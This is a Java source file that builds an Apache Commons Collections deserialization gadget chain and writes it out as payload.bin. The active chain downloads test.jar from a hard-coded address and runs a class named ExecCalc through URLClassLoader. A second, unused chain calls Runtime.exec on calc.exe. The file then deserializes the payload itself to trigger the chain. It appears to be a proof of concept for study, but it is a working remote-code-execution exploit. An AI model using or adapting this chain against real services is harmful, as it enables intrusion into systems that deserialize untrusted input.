import SerTest.SerTest;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Main {

    public static void main(String[] args) throws Exception {


        final Transformer[] transforms2 = new Transformer[] {

                new ConstantTransformer(java.net.URLClassLoader.class),
                // getConstructor class.class classname
                new InvokerTransformer("getConstructor",
                        new Class[] { Class[].class },
                        new Object[] { new Class[] { java.net.URL[].class } }),

                new InvokerTransformer(
                        "newInstance",
                        new Class[] { Object[].class },
                        new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                                "http://192.168.199.133:8080/test.jar") } } }),
                // loadClass String.class R
                new InvokerTransformer("loadClass",
                        new Class[] { String.class },
                        new Object[] {"ExecCalc"}),

                new InvokerTransformer("getConstructor",
                        new Class[] {Class[].class},
                        new Object[] {null}),
                // invoke
                new InvokerTransformer("newInstance",
                        new Class[] {Object[].class},
                        new Object[] {null}),
                new ConstantTransformer(1)
        };


        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {
                        String.class }, new Object[] {"calc.exe"})};

        Transformer transformedChain = new ChainedTransformer(transforms2);

        Map innerMap = new HashMap();
        innerMap.put("value", "value");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);

//        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
//        onlyElement.setValue("foobar");

//for exploit
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outerMap);

//test for SerTest
//        Class cl = Class.forName("SerTest.SerTest");
//        Constructor ctor = cl.getDeclaredConstructor(Map.class);
//        ctor.setAccessible(true);
//        Object instance = ctor.newInstance(outerMap);

        File f = new File("payload.bin");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();

        ObjectInputStream in = new ObjectInputStream(new FileInputStream(f));
        in.readObject();
        in.close();
    }
}
